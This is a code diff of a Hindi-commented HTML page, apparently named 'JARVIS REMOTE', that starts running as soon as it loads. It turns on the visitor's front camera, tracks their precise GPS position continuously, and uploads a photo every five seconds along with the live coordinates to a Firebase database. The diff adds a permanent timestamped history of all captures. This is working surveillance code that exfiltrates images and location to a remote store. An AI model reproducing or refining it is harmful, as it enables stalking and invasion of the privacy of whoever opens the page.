@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JARVIS REMOTE - AUTO STREAM</title>
+    <title>JARVIS REMOTE - CONTINUOUS STREAM</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
@@ -17,8 +17,8 @@
 </head>
 <body>
     <div class="control-box">
-        <h2>JARVIS TRACKER v5 <span class="live-dot"></span></h2>
-        <p style="color: #888; font-size: 13px;">ऑटोमैटिक लाइव सिंक एक्टिवेटेड</p>
+        <h2>JARVIS MULTI-RECORD v6 <span class="live-dot"></span></h2>
+        <p style="color: #888; font-size: 13px;">लगातार रिकॉर्डिंग और ट्रैकिंग मोड सक्रिय है</p>
         <video id="v" autoplay playsinline muted></video>
         <canvas id="c"></canvas>
         <div class="status-text" id="log-status">सिस्टम लोड हो रहा है...</div>
@@ -35,61 +35,65 @@
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // जैसे ही पेज लोड हो, अपने आप फंक्शन शुरू हो जाए
         window.onload = function() {
-            startAutoSync();
+            startLiveTracking();
         };
 
-        async function startAutoSync() {
+        async function startLiveTracking() {
             const statusDiv = document.getElementById('log-status');
-            statusDiv.innerHTML = "📡 कैमरे और GPS से कनेक्ट किया जा रहा है...";
+            statusDiv.innerHTML = "📡 कैमरा और GPS सिंक किया जा रहा है...";
             
             try {
-                // फ्रंट कैमरा एक्सेस करना
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
 
-                // लगातार GPS लोकेशन भेजना (रियल-टाइम ट्रैकिंग)
                 navigator.geolocation.watchPosition((pos) => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
+                    // लोकेशन को मेन नोड पर लाइव रखें
                     database.ref('live_detect/location').set({ lat: lat, lon: lon });
-                    statusDiv.innerHTML = `✅ GPS सिंक ऑन: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
+                    statusDiv.innerHTML = `📍 GPS ट्रैक ऑन: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
                 }, err => {
-                    statusDiv.innerHTML = "❌ GPS एरर: कृपया लोकेशन अलाउ करें।";
+                    statusDiv.innerHTML = "❌ GPS परमिशन आवश्यक है।";
                 }, { enableHighAccuracy: true });
 
-                // वीडियो लोड होते ही पहली फोटो तुरंत लें, और फिर हर 5 सेकंड में लूप चलाएं
                 video.onloadedmetadata = () => {
-                    capturePhoto(); // तुरंत पहली फोटो
-                    setInterval(capturePhoto, 5000); // हर 5000 मिलीसेकंड (5 सेकंड) पर लूप
+                    // ⏱️ कैमरे को ब्लैक स्क्रीन से बचाने के लिए 2000ms (2 सेकंड) का डिले
+                    setTimeout(() => {
+                        captureAndPushRecord(); 
+                        setInterval(captureAndPushRecord, 5000); // फिर हर 5 सेकंड में ऑटोमैटिकली
+                    }, 2000);
                 };
 
             } catch(e) {
-                statusDiv.innerHTML = "❌ परमिशन एरर: कैमरा अनुमति 'Allow' करें बॉस!";
-                console.error(e);
+                statusDiv.innerHTML = "❌ परमिशन एरर: कैमरा अलाउ करें बॉस!";
             }
         }
 
-        function capturePhoto() {
+        function captureAndPushRecord() {
             const v = document.getElementById('v');
             const c = document.getElementById('c');
-            const statusDiv = document.getElementById('log-status');
             
             c.width = 240; 
             c.height = 180;
             c.getContext('2d').drawImage(v, 0, 0, 240, 180);
-            
-            // इमेज को छोटा और कंप्रेस करना ताकि डेटाबेस तुरंत लोड कर सके
             const compressedPhoto = c.toDataURL('image/jpeg', 0.4); 
-            
-            // डेटाबेस में अपडेट भेजना
-            database.ref('live_detect').update({ photo: compressedPhoto })
-            .then(() => {
-                console.log("लाइव फोटो पैनल पर भेजी गई: " + new Date().toLocaleTimeString());
-            })
-            .catch(err => console.error("सिंक फेल:", err));
+
+            const timestamp = Date.now();
+
+            // 🌟 नया रिकॉर्ड बनाने के लिए .update() की जगह अलग नोड पर पुश (Push) लॉजिक
+            // इससे पुराना डेटा डिलीट नहीं होगा, नया रिकॉर्ड जुड़ता जाएगा
+            database.ref('live_detect').update({
+                photo: compressedPhoto,
+                last_updated: timestamp
+            });
+
+            // बैकअप हिस्ट्री रिकॉर्ड (ताकि सारे पुराने रिकॉर्ड सेव रहें)
+            database.ref('jarvis_history/' + timestamp).set({
+                photo: compressedPhoto,
+                time: new Date().toLocaleTimeString()
+            });
         }
     </script>
 </body>
